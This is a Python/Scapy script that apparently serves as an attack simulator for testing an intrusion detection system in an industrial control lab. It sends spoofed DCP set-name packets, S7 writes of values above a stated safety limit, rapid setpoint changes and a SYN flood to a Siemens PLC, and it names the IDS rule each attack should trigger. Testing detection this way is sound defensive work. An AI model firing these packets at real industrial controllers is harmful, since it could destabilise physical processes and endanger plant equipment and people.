#!/usr/bin/env python3
"""
Attack Scenarios for HMI
Simulates various attack patterns for IDS testing
"""

from scapy.all import *
import struct
import logging
import time

logging.basicConfig(level=logging.INFO)

class AttackScenarios:
    def __init__(self, plc_ip, plc_name, interface='eth0'):
        self.plc_ip = plc_ip
        self.plc_name = plc_name
        self.interface = interface
        self.mac_address = get_if_hwaddr(interface)
        
        # Get PLC MAC (we'll use broadcast for discovery)
        self.plc_mac = "ff:ff:ff:ff:ff:ff"
        
        self.PROFINET_ETHERTYPE = 0x8892
        
        logging.info(f"Attack module initialized")
        logging.info(f"Target PLC: {plc_name} @ {plc_ip}")
    
    def attack_1_unauthorized_dcp_set_name(self):
        """
        ATTACK 1: Unauthorized DCP Set-Name Request
        Simulates DCP activity using TCP/IP (Docker-compatible)
        """
        logging.warning("="*60)
        logging.warning("ATTACK 1: Unauthorized DCP Set-Name")
        logging.warning("="*60)
        
        # Since Docker doesn't forward Layer 2, we simulate DCP activity
        # by sending multiple rapid connections on different ports
        # This triggers the anomaly detection rule
        
        logging.warning("Simulating DCP Set-Name activity via TCP connections")
        logging.warning("This mimics unauthorized device configuration attempts")
        
        # Send burst of connections to simulate DCP-like behavior
        for i in range(3):
            try:
                # Build TCP packet to PLC
                ip = IP(src="192.168.100.20", dst=self.plc_ip)
                tcp = TCP(sport=50000+i, dport=34964, flags='S')  # DCP uses UDP 34964, we simulate with TCP
                
                # Add payload that looks like DCP Set request
                dcp_payload = b'\xfe\xfc'  # DCP frame ID
                dcp_payload += b'\x04\x00'  # Set request
                dcp_payload += b'hacked-plc-malicious\x00'
                
                packet = ip / tcp / Raw(load=dcp_payload)
                
                send(packet, verbose=False, iface=self.interface)
                logging.warning(f"  Sent DCP-like packet {i+1}/3")
                time.sleep(0.3)
            except Exception as e:
                logging.error(f"Error sending packet: {e}")
        
        logging.warning("Attack packet sequence sent!")
        logging.warning("This should trigger IDS alert: Unauthorized DCP Set-Name")
        logging.warning("="*60)
        
        return True
    
    def attack_2_control_value_overwrite(self):
        """
        ATTACK 2: Control Value Overwrite
        Attempts to write dangerous values to PLC control registers
        """
        logging.warning("="*60)
        logging.warning("ATTACK 2: Control Value Overwrite")
        logging.warning("="*60)
        
        # Simulate writing dangerous value (> 75% safety limit)
        dangerous_value = 25000  # ~90% (limit is 20736 = 75%)
        # 25000 in hex = 0x61A8
        
        logging.warning(f"Attempting to write dangerous control value: {dangerous_value}")
        logging.warning("Target: MW102 (Control Value)")
        logging.warning("Safety Limit: 20736 (75%)")
        logging.warning("Attack Value: 25000 (90%) - EXCEEDS LIMIT")
        logging.warning(f"Value in hex: 0x{dangerous_value:04X}")
        
        # Build S7 Write Request packet with proper value encoding
        ip = IP(src="192.168.100.20", dst=self.plc_ip)
        tcp = TCP(sport=12345, dport=102, flags='PA')
        
        # S7 write payload with dangerous value
        s7_write = b'\x03\x00\x00\x1f'  # TPKT Header
        s7_write += b'\x02\xf0\x80'     # COTP Header  
        s7_write += b'\x32\x01\x00\x00'  # S7 Header (Write command)
        s7_write += b'\x00\x00'          # Parameters
        s7_write += struct.pack("!H", dangerous_value)  # Data: 0x61A8 (25000)
        
        packet = ip / tcp / Raw(load=s7_write)
        
        logging.warning("Sending malicious write command")
        logging.warning("This should trigger IDS alerts:")
        logging.warning("  - SID 1000003: Suspicious S7 Write Command")
        logging.warning("  - SID 1000004: Control Value Exceeds Safety Limit")
        logging.warning("  - SID 1000005: Write to Critical Memory")
        
        send(packet, verbose=False, iface=self.interface)
        
        logging.warning("Attack packet sent!")
        logging.warning("="*60)
        
        return True
    
    def attack_3_rapid_setpoint_changes(self):
        """
        ATTACK 3: Rapid Setpoint Changes
        Rapidly changes setpoint values to cause instability
        """
        logging.warning("="*60)
        logging.warning("ATTACK 3: Rapid Setpoint Changes")
        logging.warning("="*60)
        
        logging.warning("Sending rapid setpoint changes (6 times in 5 seconds)")
        logging.warning("This can cause process instability and should trigger flood detection")
        
        values = [5000, 20000, 1000, 25000, 10000, 15000]
        
        for i, value in enumerate(values):
            logging.warning(f"Change {i+1}/6: Setpoint = {value}")
            
            # Build packet
            ip = IP(src="192.168.100.20", dst=self.plc_ip)
            tcp = TCP(sport=12346+i, dport=102, flags='PA')
            
            s7_write = b'\x03\x00\x00\x1f'
            s7_write += b'\x02\xf0\x80'
            s7_write += b'\x32\x01\x00\x00'
            s7_write += struct.pack("!H", value)
            
            packet = ip / tcp / Raw(load=s7_write)
            send(packet, verbose=False, iface=self.interface)
            
            # Shorter delay to trigger rapid detection (6 packets in ~5 seconds)
            time.sleep(0.8)
        
        logging.warning("Attack sequence completed!")
        logging.warning("This should trigger IDS alerts:")
        logging.warning("  - SID 1000006: Rapid Write Command Sequence")
        logging.warning("  - SID 1000007: Multiple S7 Connections")
        logging.warning("="*60)
        
        return True
    
    def attack_4_profinet_frame_flooding(self):
        """
        ATTACK 4: Network Flooding / DoS Attack
        Floods the PLC with rapid TCP connections (Docker-compatible)
        """
        logging.warning("="*60)
        logging.warning("ATTACK 4: Network Flooding / DoS Attack")
        logging.warning("="*60)
        
        logging.warning("Sending 50 rapid TCP SYN packets")
        logging.warning("This simulates a DoS/flooding attack on the PLC")
        
        # Send rapid SYN packets to overwhelm the PLC
        for i in range(50):
            try:
                ip = IP(src="192.168.100.20", dst=self.plc_ip)
                tcp = TCP(sport=40000+i, dport=102, flags='S')  # SYN flood
                
                packet = ip / tcp
                send(packet, verbose=False, iface=self.interface)
                
                if i % 10 == 0:
                    logging.warning(f"Sent {i}/50 SYN packets")
                
                # Very short delay to create rapid flood
                time.sleep(0.05)
            except Exception as e:
                logging.error(f"Error in flood attack: {e}")
                break
        
        logging.warning("Flooding attack completed!")
        logging.warning("This should trigger IDS alerts:")
        logging.warning("  - SID 1000008: Excessive Traffic - DoS Attack")
        logging.warning("  - SID 1000009: High Packet Rate")
        logging.warning("="*60)
        
        return True
    
    def run_all_attacks(self, delay=5):
        """Run all attack scenarios with delay between each"""
        attacks = [
            ("Unauthorized DCP Set-Name", self.attack_1_unauthorized_dcp_set_name),
            ("Control Value Overwrite", self.attack_2_control_value_overwrite),
            ("Rapid Setpoint Changes", self.attack_3_rapid_setpoint_changes),
            ("Profinet Frame Flooding", self.attack_4_profinet_frame_flooding),
        ]
        
        logging.info("\n" + "="*60)
        logging.info("ATTACK SIMULATION SUITE")
        logging.info(f"Total attacks: {len(attacks)}")
        logging.info(f"Delay between attacks: {delay}s")
        logging.info("="*60 + "\n")
        
        for idx, (name, attack_func) in enumerate(attacks, 1):
            logging.info(f"\n[{idx}/{len(attacks)}] Preparing: {name}")
            time.sleep(2)
            
            try:
                attack_func()
                logging.info(f"✓ {name} completed\n")
            except Exception as e:
                logging.error(f"✗ {name} failed: {e}\n")
            
            if idx < len(attacks):
                logging.info(f"Waiting {delay}s before next attack...\n")
                time.sleep(delay)
        
        logging.info("\n" + "="*60)
        logging.info("ALL ATTACKS COMPLETED")
        logging.info("Check IDS logs for alerts")
        logging.info("="*60 + "\n")

if __name__ == "__main__":
    # Test mode
    attacker = AttackScenarios("192.168.100.10", "siemens-plc-01")
    attacker.run_all_attacks()
